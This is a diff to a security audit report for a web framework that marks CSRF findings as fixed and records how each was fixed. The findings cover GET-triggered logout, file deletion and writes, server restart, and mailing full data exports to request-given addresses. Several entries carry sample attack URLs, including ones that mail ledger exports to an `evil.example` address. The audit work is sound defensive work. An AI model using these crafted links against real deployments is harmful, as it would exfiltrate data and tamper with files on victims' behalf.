@@ -30,8 +30,9 @@ Medium; confirmed (second check).
 
 #### SEC-WEB-04. Transitions with the default method run their actions on a GET with no token
 
-Medium; confirmed (lead).
+Medium; confirmed (lead); fixed.
 
+- **Fix:** Fixed 2026-11-16: a GET or HEAD of a transition that runs actions and is not read-only is refused with 403 when another site started it (`Sec-Fetch-Site` not `same-origin` or `none`, or, without it, a `Referer` of another host) and it carries no session token (`render.rs` `cross_site_write`, `web::started_by_another_site`). The app's own links and the menu's logout still work. Tests: `web/tests.rs` `a_request_another_site_started_is_told_by_its_fetch_site_or_referer`, `framework/test/client/SecurityScreens.spec.js`.
 - **Where:** `crates/moqui-core/src/screen/render.rs:2667-2672`, `:2070-2098`; `crates/moqui-core/src/screen/definition.rs:383-387`; `crates/moqui-core/src/user/session.rs:3002`
 - **Reached by:** another site that makes a signed-in user's browser navigate (a link, a redirect, `window.open`) to a transition URL with no query string; the `SameSite=Lax` cookie is sent on a top-level `GET`.
 - **What happens:** The rule is in A1. A writing transition that needs no parameter, takes its parameter as a `path-parameter`, or reads its input from the session runs for the victim. `GET /Login/logout` and `GET /rest/logout` are two: each signs the session out and sets `hasLoggedOut`, which signs out the user's other sessions at their next request. The other affected transitions are another slice's list.
@@ -84,8 +85,9 @@ Medium; reported (confirmed in code).
 
 #### SEC-RTE-04. `emailScreenAsync` mails a full report to a request-given address by `GET`
 
-Medium; reported (confirmed in code).
+Medium; reported (confirmed in code); fixed.
 
+- **Fix:** Fixed 2026-11-15 with SEC-MAIL-61: the transitions are not read-only, pass a fixed set of fields, and take a POST with the session token.
 - **Where:** `runtime/components/base/webroot/template/screen/BasicTransitions.xml:20`
 - **Reached by:** a signed-in user who may view one of the including screens and follows a link such as `/apps/.../FindTransactionEntry/emailScreenAsync?toAddresses=x@evil.example&screenRenderMode=csv`.
 - **What happens:** The transition is `read-only`, so it takes its parameters from the URL and a `GET` is never token-checked; the session cookie is `SameSite=Lax`, which a cross-site top-level navigation carries. The service renders the including screen with `pageNoLimit=true` as the victim and mails it to `toAddresses`. `emailTemplateId`, `ccAddresses` and `bccAddresses` also come from the request.
@@ -97,8 +99,9 @@ Medium; reported (confirmed in code).
 
 #### SEC-RTE-05. `/resources` runs elFinder write commands on a `GET`
 
-Medium; reported (confirmed in code).
+Medium; reported (confirmed in code); fixed.
 
+- **Fix:** Fixed 2026-11-16: the elFinder write commands refuse a request another site started (`crates/moqui-dav/src/elfinder.rs` `write_refused`, the SEC-WEB-04 test); the file manager's own requests run. Test: `SecurityScreens.spec.js`.
 - **Where:** `runtime/components/base/webroot/screen/webroot.xml:257`; `crates/moqui-dav/src/elfinder.rs:760`
 - **Reached by:** a signed-in `ADMIN` who follows a crafted link (`/resources?resourceRoot=...&cmd=put&target=...&content=...`, or `cmd=rm`, `rename`, `mkdir`, `mkfile`).
 - **What happens:** The transition is `read-only` with no `method`, so a `GET` with URL parameters runs any command and no session token is asked. The root comes from the request (`component://`, `file:` and others). In production writes go only to `dbresource://`, `content://` and `git://` roots; on any other instance purpose they go to every root, a component's scripts and screens included.
@@ -208,8 +211,9 @@ Medium; reported (confirmed in code).
 
 #### SEC-TLS-04. State-changing transitions that run on a cross-site GET
 
-Medium; confirmed (lead).
+Medium; confirmed (lead); fixed.
 
+- **Fix:** Fixed 2026-11-16 by the framework rule of SEC-WEB-04: each listed transition runs actions and is not read-only, so a GET another site started is refused.
 - **Where:** `crates/moqui-core/src/screen/definition.rs:387`, `render.rs:2076-2099`, `:2668-2673`; the transitions below
 - **Reached by:** a signed-in holder of the screen who follows a link (or loads an image URL that the browser sends with the Lax cookie only on top-level navigation, so a link or redirect) to the transition's URL with no query string.
 - **What happens:** A default-method transition with actions is refused only when the URL carries parameters. One that needs none runs on a GET with no token. In this slice: `System/Cache/CacheList/clearAllCaches` and `clearArtifactCaches`; `System/Conf/Changes/reloadConf` and `restartServer` (a dev instance restarts); `System/EdgeNode/Status/unpair` and `unpairFront` (the edge pairing is revoked and removed from `runtime/.env`), `drainSelf` (`drain` defaults to true: `/health` answers 503); `System/EdgeClients/Domains/recheckConflicts`; `System/Monitor/Settings/revertAll`; `System/Llm/Usage/rollupUsage`, `System/Llm/Skills/SkillList/syncSkills`; `System/Print/Printer/PrinterList/getServerPrinters`; `System/Integrations/SystemMessages/sendAllMessages` and `consumeAllMessages`; `Tools/Data/Snapshots/exportSnapshot` (starts an export of every entity to a zip under `runtime/db/snapshot`). `runBackup` is not one: `run#Backup` requires `reason`.
@@ -380,8 +384,9 @@ Medium; reported (confirmed in code).
 
 #### SEC-MAIL-03. An anonymous GET changes the status of any mailbox or Outbox message
 
-Medium; reported (confirmed in code).
+Medium; reported (confirmed in code); fixed.
 
+- **Fix:** Fixed 2026-11-15 with SEC-RTE-01: the tracking image needs the message's keyed view key and moves only an `ES_SENT` message.
 - **Where:** `crates/moqui-core/src/web/mod.rs:1289-1340` (`view_email_message`, `mark_email_message_viewed`); `runtime/components/base/framework/entity/BasicEntities.xml:670-675`
 - **Reached by:** anonymous, `GET /email/{emailMessageId}` with a guessed sequenced id.
 - **What happens:** The handler marks any `EmailMessage` `ES_VIEWED` with authorization disabled when the status flow allows it, and the flow allows it from `ES_READY`, `ES_SENT` and `ES_RECEIVED`. Those are also the statuses of the mail client's rows: a message waiting in a user's Outbox or being sent (`ES_READY`) leaves the Outbox queries and the job that retries a stopped send, so it is never sent and no longer listed; an Inbox message (`ES_RECEIVED`) leaves the unread count query and the out-of-office reply, and its `receivedDate` is overwritten. Ids are sequenced, so a loop over a range hits every message.
@@ -402,8 +407,9 @@ Medium; reported (confirmed in code).
 
 #### SEC-MAIL-62. A GET mails a screen's full export to an address the request names
 
-Medium; reported (confirmed in code).
+Medium; reported (confirmed in code); fixed.
 
+- **Fix:** Fixed 2026-11-15 with SEC-MAIL-61 (the same transitions).
 - **Where:** runtime/components/base/webroot/template/screen/BasicTransitions.xml:20-28 (and 29-37); runtime/components/base/framework/service/org/moqui/mail/EmailServices.xml:242-264
 - **Reached by:** an outsider who gets a signed-in user of one of the five mr-marble accounting screens to open a link (`.../FindTransactionEntry/emailScreenAsync?toAddresses=attacker@x&screenRenderMode=csv`); or that user directly.
 - **What happens:** The transition is `read-only="true"` with a service call, so a GET with URL parameters runs it and no session token is checked. It renders the active screen with `pageNoLimit=true` as xlsx or csv and mails it through the `SYSTEM` server to `toAddresses`, `ccAddresses` and `bccAddresses` from the request, with `emailTemplateId` also the request's. One click sends every general ledger entry or the whole asset list to an outside address; `emailScreenUserAsync` fixes only `toAddresses` and leaves cc and bcc to the request.
@@ -426,8 +432,9 @@ Medium; reported (confirmed in code).
 
 #### SEC-FIL-01. `/resources` runs elFinder write commands on a GET with no session token
 
-Medium; reported (confirmed in code).
+Medium; reported (confirmed in code); fixed.
 
+- **Fix:** Fixed 2026-11-16 with SEC-RTE-05 (the same finding).
 - **Where:** `runtime/components/base/webroot/screen/webroot.xml:257`; `crates/moqui-core/src/screen/render.rs:2670`; `crates/moqui-dav/src/elfinder.rs:671,760`
 - **Reached by:** a member of `ADMIN` with a cookie session who follows a link on another site to `GET /resources?resourceRoot=...&cmd=rm&targets[]=<hash>` (or `cmd=put&target=<hash>&content=...`, `mkdir`, `mkfile`, `rename`).
 - **What happens:** The transition is `read-only`, so URL parameters are accepted, and the session token is checked only for POST, PUT, PATCH and DELETE. The session cookie is `SameSite=Lax`, which a top-level cross-site GET carries. A target hash is the volume id and the Base64 of a path, so it is computed, not guessed. `rm` of a folder deletes everything under it; in production this covers `dbresource://` (the drives live under `dbresource://drive`) and `git://` roots, and on a non-production instance also `file:`, `runtime://` and `component://`, where `put` writes code.
@@ -760,8 +767,9 @@ Medium; reported (confirmed in code).
 
 #### SEC-BOS-03. An invitation is accepted by a bare GET for a signed-in user
 
-Medium; reported (likely).
+Medium; reported (likely); fixed.
 
+- **Fix:** Fixed 2026-11-16 by the framework rule of SEC-WEB-04: `acceptExisting` runs actions and is not read-only, so a GET another site started is refused; the page's Accept button posts.
 - **Where:** runtime/components/addon/mr-boss/screen/AcceptInvitation.xml:35
 - **Reached by:** an identity operator (`ADMIN_IDENTITY_MANAGE`) who issued the invitation and knows its link, through a signed-in victim's click or page load of `/i/<token>/acceptExisting`
 - **What happens:** `acceptExisting` has no `method`, so a GET with no query string runs `accept#Invitation`. A signed-in user whose address is the invited one gets an organization relationship and group memberships without pressing Accept, and becomes an identity of the inviter's organization.
